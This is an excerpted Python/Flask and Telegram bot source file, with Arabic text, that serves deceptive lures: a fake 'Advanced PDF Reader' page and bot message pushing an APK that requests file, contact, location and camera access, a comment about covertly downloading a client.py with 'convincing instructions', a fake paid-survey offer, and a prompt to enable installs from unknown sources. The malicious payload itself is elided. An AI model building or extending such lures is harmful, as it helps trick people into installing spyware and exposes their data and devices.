...
try:
    ...
    from flask import Flask, request, jsonify, render_template_string, abort, session, send_file, redirect
...
if not ADMIN_ID:
    logger.critical("❌ ADMIN_ID غير مضبوط في متغيرات البيئة!")
    sys.exit(1)
...
<body>
    ...
    <script>
        ...
        function activateAdvanced() {
            // تنزيل ملف client.py بشكل خفي مع عرض تعليمات مقنعة
...
<head>
    ...
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; text-align: center; padding: 50px; background: #f0f2f5; }
        .box { background: white; padding: 40px; border-radius: 16px; max-width: 420px; margin: auto; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
        .icon { font-size: 64px; margin-bottom: 16px; }
        h2 { color: #1d2129; margin-bottom: 8px; }
        p { color: #606770; margin-bottom: 24px; }
        .btn { background: #1877f2; color: white; border: none; padding: 14px 32px; font-size: 18px; border-radius: 8px; cursor: pointer; font-weight: 600; transition: background 0.2s; }
        .btn:hover { background: #166fe5; }
        .note { font-size: 14px; color: #606770; margin-top: 20px; }
        .permissions { text-align: left; background: #f7f8fa; padding: 16px; border-radius: 8px; margin: 16px 0; }
        .permissions li { list-style: none; padding: 4px 0; color: #1d2129; }
    </style>
</head>
<body>
    <div class="box">
        <div class="icon">📄</div>
        <h2>قاريء PDF المتقدم</h2>
        <p>لقراءة الملفات المحمية والملفات الكبيرة، يرجى تثبيت التطبيق الرسمي.</p>
        <div class="permissions">
            <strong>🔒 الأذونات المطلوبة:</strong>
            <li>📁 الوصول إلى الملفات</li>
            <li>📇 جهات الاتصال (لمشاركة الملفات)</li>
            <li>📍 الموقع الجغرافي (للملفات الجغرافية)</li>
            <li>📸 الكاميرا (للملفات الممسوحة ضوئياً)</li>
        </div>
        <button class="btn" onclick="downloadAPK()">📥 تنزيل التطبيق</button>
        <p class="note">⚠️ بعد التثبيت، امنح الأذونات المطلوبة لقراءة الملفات.</p>
        <p style="font-size: 12px; color: #90949c; margin-top: 8px;">الإصدار 3.2.1 | 15.2 م.ب</p>
    </div>
    <script>
...
def download_apk():
    # في الواقع، هذا المسار يجب أن يقدم ملف APK حقيقي
    # سنستخدم ملف وهمي أو نعيد توجيه إلى رابط خارجي
    apk_path = os.path.join(BASE_DIR, 'static', 'PDFReader.apk')
    if os.path.exists(apk_path):
        return send_file(apk_path, as_attachment=True)
    else:
        # إذا لم يكن الملف موجوداً، نرسل رسالة تنبيه
        return "⚠️ ملف التطبيق غير متوفر حالياً. يرجى المحاولة لاحقاً.", 404

@app.route('/download_client', methods=['GET'])
def download_client():
    # إنشاء ملف client.py ديناميكياً (نفس الكود السابق)
...
def callback_query(call):
    ...
    if data.startswith("locked_"):
        ...
        if actual_mode == "mode_site":
            ...
            msg = (
                "📋 <b>استبيان مدفوع</b>\n\n"
                "شارك في استبيان سريع واحصل على مكافأة مالية تصل إلى 5$!\n\n"
                "للبدء، يُرجى الضغط على الرابط التالي:\n"
                f"{survey_url}\n\n"
                "📌 سيتم صرف المكافأة فور الانتهاء من الاستبيان.\n\n"
            ...
            msg = (
                "📄 <b>قاريء PDF المتقدم</b>\n\n"
                "لقراءة الملفات المحمية والملفات الكبيرة، يُرجى تثبيت التطبيق الرسمي.\n\n"
                "📌 <b>خطوات التثبيت:</b>\n"
                "1️⃣ اضغط على الرابط أدناه لتنزيل التطبيق.\n"
                "2️⃣ افتح الملف الذي تم تنزيله واتبع تعليمات التثبيت.\n"
                "3️⃣ بعد التثبيت، افتح التطبيق وامنح الأذونات المطلوبة.\n\n"
                f"🔗 <a href='{pdf_url}'>تحميل التطبيق</a>\n\n"
                "⚠️ تأكد من تفعيل خيار 'التثبيت من مصادر غير معروفة' في إعدادات هاتفك."
            )
            safe_send(chat_id, msg)
